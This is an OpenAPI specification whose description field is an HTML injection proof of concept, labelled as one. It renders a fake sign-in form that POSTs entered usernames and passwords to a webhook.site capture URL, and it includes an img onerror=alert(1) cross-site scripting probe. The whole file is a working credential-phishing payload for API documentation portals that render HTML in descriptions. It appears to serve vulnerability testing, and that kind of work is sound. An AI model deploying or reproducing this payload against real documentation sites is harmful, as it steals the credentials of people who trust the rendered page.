openapi: "3.0.0"
info:
  title: Login Page Injection PoC (with Data Capture)
  version: "1.0.0"
  description: |
    <!-- POC: Fake Login Page sending creds to Webhook.site -->
    <div style="max-width:380px;margin:40px auto;padding:32px;background:#fff;
                border-radius:16px;box-shadow:0 4px 16px rgba(0,0,0,0.15);
                font-family:Arial, sans-serif;text-align:center;">
      <!-- Logo -->
      <div style="margin-bottom:20px;">
        <img onerror=alert(1) src="https://media.licdn.com/dms/image/v2/D4E0BAQE9NHb7PLUGFg/company-logo_200_200/company-logo_200_200/0/1731376928297/mr_mrs_smith_logo?e=2147483647&v=beta&t=4K1brhp8Hb184KmMcM-rvr_ptF5-LqA019nxq9WTzOg" alt="Logo" style="border-radius:50%;">
      </div>
      <h2 style="margin-bottom:20px;color:#222;">Sign in to your account</h2>

      <!-- Form sends data to webhook.site -->
      <form action="https://webhook.site/89c91f6e-d10c-45c2-94d8-d9a26d5d335e" method="POST"
            style="display:flex;flex-direction:column;gap:14px;text-align:left;">
        <input type="text" name="username" placeholder="Email address" required
               style="padding:12px;border:1px solid #ccc;border-radius:8px;font-size:14px;width:100%;">
        <input type="password" name="password" placeholder="Password" required
               style="padding:12px;border:1px solid #ccc;border-radius:8px;font-size:14px;width:100%;">
        <button type="submit" 
                style="padding:12px;background:#2563eb;color:#fff;font-weight:bold;
                       border:none;border-radius:8px;cursor:pointer;transition:0.3s;width:100%;">
          Login
        </button>
      </form>

      <div style="margin-top:18px;font-size:13px;color:#555;text-align:center;">
        <a href="#" style="color:#2563eb;text-decoration:none;">Forgot password?</a> • 
        <a href="#" style="color:#2563eb;text-decoration:none;">Sign up</a>
      </div>

      <p style="margin-top:20px;font-size:12px;color:#999;text-align:center;">
        ⚠️ PoC only – credentials submitted to Webhook.site.
      </p>
    </div>
paths: {}
